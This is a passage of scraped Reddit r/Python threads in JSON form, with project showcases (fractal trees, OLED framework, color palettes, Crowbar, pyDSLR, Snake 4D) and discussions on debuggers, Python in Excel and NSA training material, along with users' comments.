                    ]
                },
                {
                    "author": "echocage",
                    "score": "3",
                    "content": "I just write embedded cpp or c for my low latency required code and write the rest in python"
                },
                {
                    "author": "yrubooingmeimryte",
                    "score": "3",
                    "content": "It's actually much farther."
                }
            ]
        },
        {
            "author": "cacheing",
            "score": "2",
            "content": "Creator of cacheing here, this is awesome!"
        }
    ]
},
{
    "post_author": "Satanic_bumblebee",
    "post_id": "gwdjwr",
    "post_score": "2678",
    "post_time": "Thursday, June 4, 2020 at 11:41:27 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made a fractal tree in python using turtle",
    "media": [
        "https://preview.redd.it/l8fryljmvu251.png?auto=webp&s=3c1cc3a0fee6ebf8d9dbe45cf23991bda3a84407",
        "https://i.redd.it/l8fryljmvu251.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "94",
            "content": "Nice one I tried to make an L-system interpreter, but only managed to break my mind in the process"
        },
        {
            "author": "[deleted]",
            "score": "168",
            "content": "You tellin me turtles coded this?"
        },
        {
            "author": "pm-me-ur-uneven-tits",
            "score": "28",
            "content": "Would you be willing to share your github repo?"
        },
        {
            "author": "[deleted]",
            "score": "19",
            "content": "I once tried to compute the Julia set, but damn, it was slow af. But Cython/OpenMP did the work. Be sure to take a look at it, it's worth the shot if you want faster computing."
        },
        {
            "author": "Schneggl",
            "score": "13",
            "content": "I'm a newby, is turtle useful for anything besides drawing images? Not trying to be mean, OP's drawing is very neat and I couldn't do it, just genuinely curious."
        },
        {
            "author": "MustafaAnas99",
            "score": "6",
            "content": "Man these amazing python drawing should be gathered somewhere and referenced. It would be really helpful to others. Good work buddy"
        },
        {
            "author": "byParallax",
            "score": "6",
            "content": "That's pretty cool, looks like a r/generative artwork!"
        },
        {
            "author": "hellfiniter",
            "score": "4",
            "content": "is it backtracking with one turtle or multiple turtles? what is the depth of this tree? would be impressive if just one turtle drew all of it"
        },
        {
            "author": "TheZeusHimSelf1",
            "score": "3",
            "content": "Binary?"
        },
        {
            "author": "[deleted]",
            "score": "2",
            "content": "Great Work 🚀"
        }
    ]
},
{
    "post_author": "danyourmaster",
    "post_id": "1d1fdqb",
    "post_score": "57",
    "post_time": "Monday, May 27, 2024 at 3:35:24 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "SH1106 OLED Screen App Framework for Raspberry Pi - Now on PyPI",
    "media": [
        "https://github.com/danspage/sh1106-framework",
        "https://pypi.org/project/sh1106-framework/"
    ],
    "post_content": "What it does:\nToday, I released the first working version of my SH1106 app framework for Raspberry Pi on PyPI! The SH1106 is an affordable OLED screen, costing under $3, and it's perfect for projects of all sizes. This package enables the creation of apps for it with graphics support, state management, image conversion utilities, and custom fonts. Check it out here: SH1106 Framework on PyPI.\nTarget audience:\nThe package is mainly aimed at hobbyists who want to create small projects using the SH1106 OLED without having to manually write a lot of the graphics code typically needed on top of standard packages. I am also developing a hardware synthesizer keyboard from scratch that utilizes this framework extensively. So far, the framework handles the massive scaling required for this project excellently in terms of both code organization and performance.\nComparison:\nThis package offers several advantages over other SH1106 packages:\nImproved Rendering Speed: It significantly speeds up the rendering time for a given frame by writing all graphical operations to a pixel array, which is then loaded onto the screen using low-level functions from the excellent luma.oled package.\nEfficient Resource Management: All images and fonts are pre-loaded during the initialization of the framework, reducing the processing time during rendering.\nState Management: A simple yet effective state management system is implemented, making app creation straightforward from the start.\nYou can also check out the project on GitHub: SH1106 Framework on GitHub.\nI'd love to answer any questions you have in the comments! I hope you find some cool uses for it. Cheers! :)",
    "comments": [
        {
            "author": "Hockeygoalie35",
            "score": "2",
            "content": "More frameworks are always nice, thanks! Just looked it up, how is it different than the SSD1306, which seem more widely used?",
            "replies": [
                {
                    "author": "danyourmaster",
                    "score": "3",
                    "content": "The SH1106 is just the display I happened to have for the project I was working on when I developed the package - it’s quite possible that this package is completely useable with that one just by swapping the SH1106 keyword in Drawing.py with the one for the SSD1306, as referred to by the luma.oled package. If someone wanted to test it and submit a pull request, I’d be more than happy to merge it and change the package name to something more generic!"
                }
            ]
        },
        {
            "author": "aciokkan",
            "score": "1",
            "content": "I'll give it a try on GC9A01, in a few weeks. I wonder if it can be ported to Micro python, as I have a project I use that for my aquarium. I had to butcher an existing library to make it work. Thanks for sharing",
            "replies": [
                {
                    "author": "danyourmaster",
                    "score": "2",
                    "content": "That would be awesome, thanks so much! Feel free to update me or do a pull request when you try it! Just a heads up, this library only supports monochromatic displays, so you’ll have to write the LCD implementation using only one color."
                }
            ]
        },
        {
            "author": "RevolutionaryRain941",
            "score": "1",
            "content": "Amazing. You have not only made a nice project but also optimized it. Keep it up."
        }
    ]
},
{
    "post_author": "R0dartha",
    "post_id": "dmzs6s",
    "post_score": "2677",
    "post_time": "Friday, October 25, 2019 at 7:21:00 PM GMT+3",
    "flair_text": "",
    "post_title": "I created a python script to generate color palettes from images (info + github link in comments)",
    "media": [
        "https://preview.redd.it/70kl5aweqpu31.jpg?width=640&crop=smart&auto=webp&s=7dd8af095f666a9efa774477f7f5f3cb61542749",
        "https://i.redd.it/70kl5aweqpu31.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "R0dartha",
            "score": "185",
            "content": "Github repo: https://github.com/rodartha/ColorPalette/ So I designed this because I wanted to do an in-depth color study on some of my favorite directors. I would love to hear suggestions for improvements and additions. I’m also more than game to answer any questions people have on how it works. Edit: huge thanks for my first gold ever!",
            "replies": [
                {
                    "author": "Smok3dSalmon",
                    "score": "20",
                    "content": "There is an iOS app that does this. Thanks for this, it's a great tool! How does it work? How many colors constitute a palette? Is it variable? Could this work to create a color palette from a clothing outfit?",
                    "replies": [
                        {
                            "author": "R0dartha",
                            "score": "96",
                            "content": "It can create a color palette from any image. You can define the number of colors you want but I think in general 5-6 is a nice amount. As for how it works, it uses something called k-means clustering where essentially I am plotting all the colors on a graph as points then calculating the distance between points to group them into “clusters” and then using the largest clusters to determine what colors are most prevalent.",
                            "replies": [
                                {
                                    "author": "o11c",
                                    "score": "7",
                                    "content": "Are you doing the clustering in sRGB or do you convert to Lab? The latter should give much better results. Of course, if you want really good results, you have to convert to Munsell, but that involves ridiculous amounts of nonlinear interpolation, and most implementations are horribly broken."
                                },
                                {
                                    "author": "penatbater",
                                    "score": "2",
                                    "content": "Are those clusters the number of colors set by the user?"
                                }
                            ]
                        },
                        {
                            "author": "godziella",
                            "score": "2",
                            "content": "What’s the iOS app called??",
                            "replies": [
                                {
                                    "author": "Smok3dSalmon",
                                    "score": "2",
                                    "content": "Pantone is the one I used briefly. Here is a list of other apps that do the same thing too. https://www.lifewire.com/the-10-best-colors-apps-of-2018-4178722"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "shaggorama",
            "score": "113",
            "content": "You're basically just running kmeans on the pixels, right? If that's correct, I'd strongly recommend you use a \"perceptually uniform\" color space and distance metric, like CIELAB. Even HSV would be better than RGB. The issue with just using RGB is that perceived color proximity doesn't correlate well to euclidean distance in RGB space. Two colors can be \"numerically close\" in RGB without being perceptually similar. https://en.m.wikipedia.org/wiki/Color_difference",
            "replies": [
                {
                    "author": "R0dartha",
                    "score": "28",
                    "content": "This is true, and a very good point. This was just a quick script I threw together yesterday morning because I was bored so I wasn’t really taking things like this into account but it would definitely be smart to add this in, I will look into it!"
                }
            ]
        },
        {
            "author": "DARPA1191969v1",
            "score": "29",
            "content": "K Means Quantitative Analysis Did this for a capstone 6 months ago. Also did 2049 and about 45 other movies. About 8 Million frames all in."
        }
    ]
},
{
    "post_author": "CanaryHill",
    "post_id": "1d3m6do",
    "post_score": "36",
    "post_time": "Wednesday, May 29, 2024 at 11:38:50 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Zango - New python framework for building enterprise ready business apps. Salesforce alternative.",
    "media": [
        "https://github.com/Healthlane-Technologies/Zango"
    ],
    "post_content": "What My Project Does\nZango, built on top of Django, is further opinionated towards building enterprise ready custom business apps. Includes additional batteries for out of the box enterprise readiness and rapid app development. Growing ecosystem of packages that serves as building blocks of apps.\nZango also enables multi-tenancy where each tenant, representing an app/microservices, can be deployed independently on the same underlying monolith. Tenants have logically seperated db, codebase as well as deployment. This significantly cuts down per app hosting cost and enables microservices pattern without the cost overhead.\nTarget Audience\nEnterprises: Benefits from the open core concept. No vendor lock-ins. Rapid development with out-of-the-box enterprise readiness.\nStartups: Get productive from day-1. Leverage packages to reach MVP really fast and not be constrained by limit on customizability (as with low-code/no-code solutions). Lowest cost of hosting if you have multiple apps or building microservices.\nConsulting/ Development companies: Increase development efficiency and optimize on hosting cost.\nYou: If you are looking to develop any bespoke app, give it a try :)\nComparison\nWeb dev frameworks(e.g. Django): Not opinionated for enterprise readiness/ business apps. Zango enables faster development, lower opex and and built-in compliance and enterprise readiness\nProprietary platforms (e.g. Salesforce): No vendor lock-in. Faster development\nLow-Code / No-Code: Limited customizability.\nMore Info\nKnow more at the project's Github repo:  https://github.com/Healthlane-Technologies/Zango",
    "comments": [
        {
            "author": "germanpickles",
            "score": "5",
            "content": "I’m a bit confused, even after reading the getting started docs. What exactly is an app (within the context of Zango)? Is it a web page? It might help to add an app example in the docs that is functional",
            "replies": [
                {
                    "author": "CanaryHill",
                    "score": "1",
                    "content": "A Zango app typically consists of a set of workflows spread across one or more user roles. It can range from a simple web page to complex CRMs, Inventory Management App, etc. We have included an example app with the source code here: https://github.com/Healthlane-Technologies/Zango/tree/main/examples/tutorial_app Noted your point about adding the example in docs as well. Thanks :)",
                    "replies": [
                        {
                            "author": "Ok_Expert2790",
                            "score": "1",
                            "content": "So kinda as a full stop between using Apex/Lighting in SF? As someone who inherited a lot of sh*t Apex & hates low code lightning, I’ll check this out !",
                            "replies": [
                                {
                                    "author": "CanaryHill",
                                    "score": "3",
                                    "content": "Yes. For a quick development sandbox setup you may launch on Gitpod using this link https://gitpod.io/#https://github.com/Healthlane-Technologies/Zango/ Tutorial for launching the Sandbox: https://www.youtube.com/watch?v=ru_p3D5I9ik"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "Tony_Gunk_o7",
            "score": "2",
            "content": "I'm interested. What's the front end for this?",
            "replies": [
                {
                    "author": "CanaryHill",
                    "score": "1",
                    "content": "Thanks for showing interest :) Zango is frontend agnostic. You can work with any frontend framework as with Django. However, using the packages available with Zango, a wide variety of applications (e.g. CRMs) can be developed with only python, without writing a single line of frontend code. Videos included with this tutorial app shows how it looks - https://github.com/Healthlane-Technologies/Zango/tree/main/examples/tutorial_app"
                }
            ]
        }
    ]
},
{
    "post_author": "coryalanfitz",
    "post_id": "1d1umwg",
    "post_score": "2",
    "post_time": "Monday, May 27, 2024 at 6:49:40 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Crowbar - Package Management without Venv",
    "media": [
        "https://t.co/psGNap3wJE"
    ],
    "post_content": "https://github.com/coryfitz/crowbar\nWhat it does:\nI'm working on a way of simplifying your Python dependency management. Basically, it handles virtual environments so you don’t have to think about them.\nFirst: pip install crowbar-package-manager\nBasically you just install and run things with the crowbar command rather than pip: crowbar install package_name\nAnd then you also run things with the crowbar command rather than using \"python\" - crowbar then runs the program based on the packages in the local environment rather than having to activate your virtual environment.\nIt's inspired by npm if you've used that with js.\nTarget audience:\nAnyone who currently uses the standard package management tools (requirements.txt, pip, etc) and wants to automate some of those processes.\nComparison:\nThe workflow is most similar to Poetry but there are a couple of major differences - for one thing, Crowbar only does package management; it doesn't create a project structure for you. Also, Poetry puts all of your environments in a central repository - Crowbar keeps it in your project folder.\nUnlike Poetry or any of the other dependency management tools out there, you don't have to buy into a completely different way of structuring your dependencies or your projects. A project that you use Crowbar on is identical to one where you used pip, venv, and requirements.txt - and if you try Crowbar and decide you don't like it, just activate your virtual environment like normal.",
    "comments": [
        {
            "author": "thisismyfavoritename",
            "score": "7",
            "content": "so you automated the source venv/bin/activate command?",
            "replies": [
                {
                    "author": "coryalanfitz",
                    "score": "-1",
                    "content": "Not really - it doesn't actually activate a virtual environment at all. Rather, if you want to run a file, rather than activating the venv and typing python filename.py, you would type crowbar filename.py and it would detect the venv folder and run the file based on the python and dependencies there. If you've used npm with javascript, it's pretty similar to that.",
                    "replies": [
                        {
                            "author": "thisismyfavoritename",
                            "score": "3",
                            "content": "run the file based on the python and dependencies there soooo kind of like source venv/bin/activate"
                        }
                    ]
                }
            ]
        },
        {
            "author": "yrubooingmeimryte",
            "score": "4",
            "content": "The world does not need another venv/pip wrapper."
        },
        {
            "author": "FRleo_85",
            "score": "4",
            "content": "relevant XKCD"
        },
        {
            "author": "Intelligent_Ad_8148",
            "score": "5",
            "content": "Poetry can also be configured put the environment in the project folder",
            "replies": [
                {
                    "author": "BidWestern1056",
                    "score": "3",
                    "content": "and pyenv"
                }
            ]
        },
        {
            "author": "jjrreett",
            "score": "2",
            "content": "looks cool. don’t understand the hate. how well does it integrate with pyenv. also how would you go about setting up a multi repo environment",
            "replies": [
                {
                    "author": "jjrreett",
                    "score": "2",
                    "content": "It defaults to creating a gitignore? will it modify a pre existing git ignore?"
                }
            ]
        },
        {
            "author": "Spleeeee",
            "score": "2",
            "content": "Very nice! I don’t understand why people hate on this. What about putting “./.venv/bin” towards the front of your path? That does most things for me well if I am in the venv dir.",
            "replies": [
                {
                    "author": "coryalanfitz",
                    "score": "2",
                    "content": "Thanks! That's essentially what it's doing behind the scenes, although it detects if you're on Windows and uses venv/Scripts in that case"
                }
            ]
        },
        {
            "author": "denehoffman",
            "score": "2",
            "content": "I think people are hating on it because this is technically what the activate script does in a venv, it just adds the venv’s bin to the front of the path, and bin contains the deactivate command to remove itself from path. So you could either write cb/crowbar in front of every command you usually use, or you could just activate the venv. Or you could just use pyenv-virtualenv and cd into the directory to activate it and cd out to deactivate. As far as I can tell, crowbar doesn’t seem to have additional functionality that venv doesn’t provide, except a .gitignore I guess? And as mentioned, it requires you to prefix every command. To me, this seems terribly inefficient, especially since the install command will check for parent folder venvs before making one, meaning you could end up installing into a different venv rather than making a new one. As OP mentions in the GitHub, if you have a venv in your home folder, good luck. Additionally, I’m not sure why some of the commands exist. If you want a package manager, why would you ever turn off .gitignore? Why would you ever want to rename your venv? And while we’re at it, why not create a hidden file .venv instead, like most other package managers? I mean how often are you going into this file to mess around really? Why is there a “show” command at all? Or anything related to configuration that isn’t just under a single “config” command? The gitignore doesn’t seem like something I’d use enough to warrant a top level command. I’m guessing you have all these extra “env” keywords because you think people will create a script with the name “show” or “create” and you’re worried this will clash with your subcommands? I think that’s kind of the danger of doing any of this in the first place. Finally, I’ll say it again, activating venvs is almost always the thing you want to do. Prefixing all your commands disables a bunch of nice shell features, like tab completion, command suggestions, and perhaps most obviously, if someone does crowbar my_cli.py -h, what do you think will happen, and do you think this is the desired behavior (note, I haven’t tried this, but I’m making an educated guess)? Devs like having the active environment in their shell prompt, it removes the necessity of another command to make sure you’re not about to screw up. And while we’re talking about shells, this recursive venv finder could be and should be (and can be, ask me how I know) a shell script with a shell hook into the cd command. Then you can actually use the venv environment variables to check whether you’ve activated one or not. I think if you really want to develop this project, you need to find your niche. Particularly, it seems your target audience is going to be people who just want to run some isolated scripts without managing a package, since this just creates a requirements.txt and doesn’t manage a setup.py or pyproject.toml like poetry or rye does. But for that to work, you need to come up with some features beyond what activating the venv would do (I’m not going to count creating and updating a gitignore just yet, sorry)"
        }
    ]
},
{
    "post_author": "Zahlii",
    "post_id": "1d3jdnf",
    "post_score": "38",
    "post_time": "Wednesday, May 29, 2024 at 9:35:47 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "pyDSLR: Easy-to-use wrapper around libgphoto2 to control your DSLR/DSLM from Linux/MacOS",
    "media": [
        "https://github.com/Zahlii/pyDSLR/blob/main/examples/lightning_trigger.py"
    ],
    "post_content": "What the Project Does\nThe idea is to provide an easy to use (and fully typed, including camera settings!) abstraction around libgphoto2, allowing even non-tech-savy users to write Python scripts/sequences to take pictures. Generally, it supports all cameras that libgphoto2 also supports!\nPossible use cases are:\nSource code/examples available here (this one can be used to automatically take an image once a lightning strike is detected): https://github.com/Zahlii/pyDSLR/blob/main/examples/lightning_trigger.py\nLightning trigger (showcased)\nBulb capture (showcased)\nHigh Speed capture (e.g. using computer vision to detect animals and use the camera as part of a wildlife trap, partly showcased)\nPhoto booths\nTimelapses (also for cameras that don't naturally support them)\nFocus bracketing (also for cameras that don't natively support them)\nAstro stacking (Taking hundreds of long exposures with fixed settings after another)\nWith a computer-controllable astro mount we could also track the camera based on preview images\nTarget Audience\nFor now, mainly Python hobby photographers, but in the future hopefully also less tech savy hobbysts.\nRight now it is obviously still a work in progress (with only types available for my Canon R6II), and I am inviting people to reach out to me if they are interested in participating or have cameras to add to our types :)\nComparison with Other Libraries\nWhen compared to other library around it:\nWe wrap python-gphoto2's low level API\ngphoto2-cffi is an alternative, but not maintained in 7 years, lacks typing support and doesn't provide much benefits over existing low-level APIs",
    "comments": [
        {
            "author": "totallynotjesus_",
            "score": "1",
            "content": "Interesting, I had to make something like this once. Is your package compatible on Windows? If not, you can try building libgphoto2 with MSYS2 and ship it with the package.",
            "replies": [
                {
                    "author": "Zahlii",
                    "score": "2",
                    "content": "Updated the Readme with windows install (via MSYS2)"
                },
                {
                    "author": "Zahlii",
                    "score": "2",
                    "content": "Not yet as I haven’t had the time to try libgphoto on windows, but it’s definitely something I’d like to check out"
                }
            ]
        }
    ]
},
{
    "post_author": "Cerricola",
    "post_id": "1d15leb",
    "post_score": "56",
    "post_time": "Sunday, May 26, 2024 at 7:50:34 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "An IDE with the same step by step functionality as in Matlab",
    "media": [],
    "post_content": "When working with Matlab I love how I can run the code step by step to debug it. Even being able to \"step in\" functions and loops.\nThen, I was looking to an IDE with a similar functionality for Python. Nowadays I'm using Spyder.",
    "comments": [
        {
            "author": "HeathenHeart87",
            "score": "122",
            "content": "Both Pycharm and VSCode have this type of functionality in their debugging features. VSCode requires a little bit more setup and installing the correct python plugins, but it's free. Pycharm just works, but the professional edition is paid (I'm unsure if debugging is included in the free version).",
            "replies": [
                {
                    "author": "Pumpoozle",
                    "score": "71",
                    "content": "PyCharm community edition includes debugging feature",
                    "replies": [
                        {
                            "author": "james_pic",
                            "score": "1",
                            "content": "Although not remote debugging IIRC.",
                            "replies": [
                                {
                                    "author": "night0x63",
                                    "score": "3",
                                    "content": "Vscode 100% has remote"
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "PM_me_butts666",
                    "score": "12",
                    "content": "the big difference between pro and community PyCharm is flask support (and even then you can develop flaks apps in community without hassle)"
                }
            ]
        },
        {
            "author": "RedEyed__",
            "score": "39",
            "content": "I just googled for you: debugging in vscod debugging in pycharm debugging in Spyder"
        },
        {
            "author": "AlexMTBDude",
            "score": "57",
            "content": "Any IDE ever created for any language has those features. It's not an IDE if there isn't debugging."
        },
        {
            "author": "alcalde",
            "score": "12",
            "content": "Every IDE has had this ability since the days of Turbo Pascal for DOS."
        },
        {
            "author": "arkie87",
            "score": "17",
            "content": "Spyder"
        },
        {
            "author": "trollsmurf",
            "score": "19",
            "content": "Jupyter?"
        },
        {
            "author": "Gr1pp717",
            "score": "8",
            "content": "This thread reminds me of when I was starting out and didn't know some word or concept and trying to ask about something related always got met with \"have you tried googling [word I didn't know]?\" And it's like, if I knew that, then I wouldn't have asked in the first place, soooo ? In this case, OP didn't know that this is a common feature of debuggers (and possibly that \"debugger\" was even a thing) and thus couldn't have known to google or look up debugger docs... OPs problem is purely a product of not having learned programming in a formal setting/being self-taught. Point is, stop being dicks when people are just trying to learn."
        }
    ]
},
{
    "post_author": "Itwist101",
    "post_id": "fgdbxb",
    "post_score": "2375",
    "post_time": "Tuesday, March 10, 2020 at 3:51:44 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made a Sudoku.com solver using Selenium",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "CMDR_Kiel42",
            "score": "332",
            "content": "> Kali Linux wallpaper > Windows 10 Wait, that's illegal... Pretty cool though.",
            "replies": [
                {
                    "author": "renaissancetroll",
                    "score": "9",
                    "content": "You can actually run Kali now with Windows Subsystem for Linux"
                },
                {
                    "author": "Itwist101",
                    "score": "18",
                    "content": "😂, thanks ;)",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "70",
                            "content": "You're welcome, but I'm still calling the cops."
                        },
                        {
                            "author": "capnwest",
                            "score": "11",
                            "content": ""
                        }
                    ]
                },
                {
                    "author": "leobeosab",
                    "score": "1",
                    "content": "",
                    "replies": [
                        {
                            "author": "sneakpeekbot",
                            "score": "1",
                            "content": ""
                        }
                    ]
                },
                {
                    "author": "Orio_n",
                    "score": "1",
                    "content": ""
                }
            ]
        },
        {
            "author": "codecommentgold",
            "score": "55",
            "content": ""
        },
        {
            "author": "jakesheets",
            "score": "25",
            "content": "This is awesome. Do you have github link? Do you use opencv or something to “see” the puzzle or is it embed in the HTML?"
        },
        {
            "author": "Captain_PizzaBoii",
            "score": "7",
            "content": "Very impressive keep up the good work :D"
        },
        {
            "author": "kijimad",
            "score": "6",
            "content": "Looks beautiful."
        },
        {
            "author": "ididilaudid",
            "score": "14",
            "content": "I made a feelz solver using ILLENIUM :)"
        },
        {
            "author": "deepraval2905",
            "score": "4",
            "content": "Source code ?"
        },
        {
            "author": "pumkinboo",
            "score": "4",
            "content": "Looks good. I just did something similar using a backtracking algorithm and pygame. Just a tip for next time you can hit 'Win' + 'G' on Windows 10 and open the Xbox screen recorder"
        },
        {
            "author": "[deleted]",
            "score": "3",
            "content": "Really nice see it getting resolved. Kudos!"
        },
        {
            "author": "eaglet123123",
            "score": "2",
            "content": "Excellent!"
        }
    ]
},
{
    "post_author": "amachefe",
    "post_id": "7kcjeq",
    "post_score": "2674",
    "post_time": "Sunday, December 17, 2017 at 10:10:30 AM GMT+3",
    "flair_text": "",
    "post_title": "Microsoft Considers Adding Python As an Official Scripting Language in Excel",
    "media": [
        "https://developers.slashdot.org/story/17/12/15/1133217/microsoft-considers-adding-python-as-an-official-scripting-language-in-excel",
        "https://external-preview.redd.it/GTBUwceyobbhHX0HcvP5dZfyaRZalJNUq90cYYb0w60.jpg?auto=webp&s=40b97887e39a77e25494b4acfac284fa68714948"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "AnomalyNexus",
            "score": "443",
            "content": "Anything that gets us away from the god forsaken vba",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "162",
                    "content": "VBA is not so bad. It sucks so much, a dedicated freelancer can make good money with it because nobody wanna use it. It kinda became the PHP of the office-world.",
                    "replies": [
                        {
                            "author": "Scypio",
                            "score": "40",
                            "content": "It sucks so much, a dedicated freelancer can make good money with it because nobody wanna use it. This is how I made my living while as a student. :D ...then I moved to working with VB6. That language sucked."
                        },
                        {
                            "author": "toyg",
                            "score": "67",
                            "content": "Or rather, considering the chronology, PHP became the VBA of the web."
                        },
                        {
                            "author": "leogodin217",
                            "score": "2",
                            "content": "That's awesome! Find a niche, hit it hard. Modern marketing 101."
                        },
                        {
                            "author": "__deerlord__",
                            "score": "2",
                            "content": "not so bad it sucks Hmmm"
                        }
                    ]
                },
                {
                    "author": "Aesthetically",
                    "score": "7",
                    "content": "Dude sometimes I use a third party library that edits excel files without opening the application because I absolutely hate vba. I think it was called NPIO and written by a team in China. \"Excel\"lent library for people who prefer c#"
                },
                {
                    "author": "FewChar",
                    "score": "5",
                    "content": "I remember cursing that in Excel between 2000 to 2003 (or round about then) they changed the command of how you set the value of cell (x,y) to z to something completely different. I always had to look up how to do the most basic stuff and then they changed the most basic function possible! I have touched it as little as possible since."
                },
                {
                    "author": "CrystalSplice",
                    "score": "2",
                    "content": "...wait, VBA is still a thing?!?",
                    "replies": [
                        {
                            "author": "jewishsupremacist88",
                            "score": "2",
                            "content": "alot of the world runs on excel."
                        }
                    ]
                },
                {
                    "author": "carpartsyouneed",
                    "score": "5",
                    "content": "😂"
                }
            ]
        },
        {
            "author": "grokkingStuff",
            "score": "163",
            "content": "Good god, if this works, it would be amazing. This could actually usher in a new age of excel scripting. Good on Microsoft for keeping up with the times."
        },
        {
            "author": "jftuga",
            "score": "57",
            "content": "Previous discussion from 2 days ago"
        },
        {
            "author": "Robotdavidbowie",
            "score": "69",
            "content": "Awesome, that will make malicious excel files so much easier to write"
        },
        {
            "author": "[deleted]",
            "score": "17",
            "content": "There are a lot of angry weirdos on /."
        },
        {
            "author": "psilnommoc",
            "score": "57",
            "content": "But as you know, the python is not a popular language for Microsoft users, so python is only a choice for Excel, maybe Microsoft will develop a new language, Python# (PythonSharp)"
        },
        {
            "author": "Matrigan",
            "score": "7",
            "content": "I hope a change like this could roll over into formulas. I'd love to be able to structure an individual cell a little bit more like a sub routine instead of one giant nested statement. Might make it a little daunting for non-programmers but the ability to format/comment could go a long way for read-ability."
        },
        {
            "author": "amachefe",
            "score": "13",
            "content": "I dont even know how to feel about it. Although that has not limited Python use with Excel. LibreOffice support for Python is pretty Basic too"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1d3qk18",
    "post_score": "7",
    "post_time": "Thursday, May 30, 2024 at 3:00:56 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Reddit__Please__Help",
            "score": "1",
            "content": "Where can I find detailed visual guides for Pyside/pyQt etc?"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1d1eqao",
    "post_score": "13",
    "post_time": "Monday, May 27, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "vitaly-zdanevich",
            "score": "1",
            "content": "My proposal if somebody wants to improve existing Python project: https://github.com/vitaly-zdanevich/geeknote, issues here https://github.com/jeffkowalski/geeknote/issues, feel free to contact me for coordination."
        }
    ]
},
{
    "post_author": "Freddykruugs",
    "post_id": "f2jda1",
    "post_score": "2356",
    "post_time": "Wednesday, February 12, 2020 at 4:53:42 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "NSA just declassified their python training documents",
    "media": [
        "https://nsa.sfo2.digitaloceanspaces.com/comp3321.pdf"
    ],
    "post_content": "https://nsa.sfo2.digitaloceanspaces.com/comp3321.pdf\nOne of the best all-in-one resources I've ever found. It starts from basics and goes all the way up to an advanced level. I would check this out, even if you're not a beginner.",
    "comments": [
        {
            "author": "lambda5x5",
            "score": "162",
            "content": "It's uploaded to archive.org"
        },
        {
            "author": "devops_q",
            "score": "73",
            "content": "u/AlSweigart Hey your book is an NSA reference, check out page 10!"
        },
        {
            "author": "Cervoxx",
            "score": "61",
            "content": "The very first line of the pdf So, you're teaching the Python class. What have you gotten yourself into? You should probably take a few moments (or possibly a few days) to reconsider the life choices that have put you into this position. This is fucking great."
        },
        {
            "author": "LakeEffectSnow",
            "score": "285",
            "content": "Having briefly skimmed it ... this is really quite good. The people got their money's worth on their tax dollars with this one. I just kind of wish it wasn't in service to an agency I distrust so badly.",
            "replies": [
                {
                    "author": "dethb0y",
                    "score": "101",
                    "content": "I like that it seems to move very quickly and be comprehensive - it's clearly meant for someone self-studying or who's very self-motivated. It is a quality little guide."
                }
            ]
        }
    ]
},
{
    "post_author": "Pella86",
    "post_id": "gyt05b",
    "post_score": "2652",
    "post_time": "Monday, June 8, 2020 at 8:41:04 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Snake 4d - 4 spatial dimension game",
    "media": [
        "https://external-preview.redd.it/OStkJFHqZ9ft6YXQiXv6sYSKvU4s15bFl34seCL3nYU.png?width=640&crop=smart&format=pjpg&auto=webp&s=d6211fa24cdd61ba2cf69d4af438f0c69dcd0b90"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "398",
            "content": "is this an attempt to fry my brain?"
        },
        {
            "author": "Pella86",
            "score": "113",
            "content": "I finally released a stable version of the project I'm working on since a while. Is a 4 spatial dimension snake game. Like the old nokia snake game but in 4D. I added a feature that allows the players to record replays and watch them again. The replay can be imported into Blender3D and rendered in a nice video. The game can be found on github in this repository: https://github.com/Pella86/Snake4d And can be started by using python main.py in the game folder. The game is purely in python, no added libraries, just python and Tkinter. All the projections are calculated and drawn on a Tkinter.Canvas."
        },
        {
            "author": "kirakun",
            "score": "18",
            "content": "Theoretically, the game should be much easier to play because you can escape via the fourth dimension. Every time you move one unit in the direction of a dimension you haven’t played, you have essentially moved to a empty board."
        },
        {
            "author": "[deleted]",
            "score": "21",
            "content": "Teacher \"The test isn't that confusing\" The test:"
        },
        {
            "author": "KruemelTM",
            "score": "8",
            "content": "This is crazy... I somehow managed to get a highscore of 12 just looking at the two planes but my brain melts trying to understand the 4D movement"
        },
        {
            "author": "Starvexx",
            "score": "5",
            "content": "This is trippy"
        },
        {
            "author": "CotoCoutan",
            "score": "4",
            "content": "Damn man, mind = blown stuff right here! Keep up the awesome work!"
        },
        {
            "author": "RAyLV",
            "score": "4",
            "content": "so, what are the controls? up,down,left,right,top,bottom,???,???"
        },
        {
            "author": "makeworld",
            "score": "4",
            "content": "This is great. Ever heard of Miegakure? It's a 4d game that's been in development for years and years, this might be a good thing for those fans lol. Nice work!"
        }
    ]
},
{
    "post_author": "HP7933",
    "post_id": "1d3k0jh",
    "post_score": "8",
    "post_time": "Wednesday, May 29, 2024 at 10:03:02 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "The Python on Microcontrollers (and Raspberry Pi) Newsletter, a weekly news and project resource",
    "media": [
        "https://www.adafruitdaily.com/"
    ],
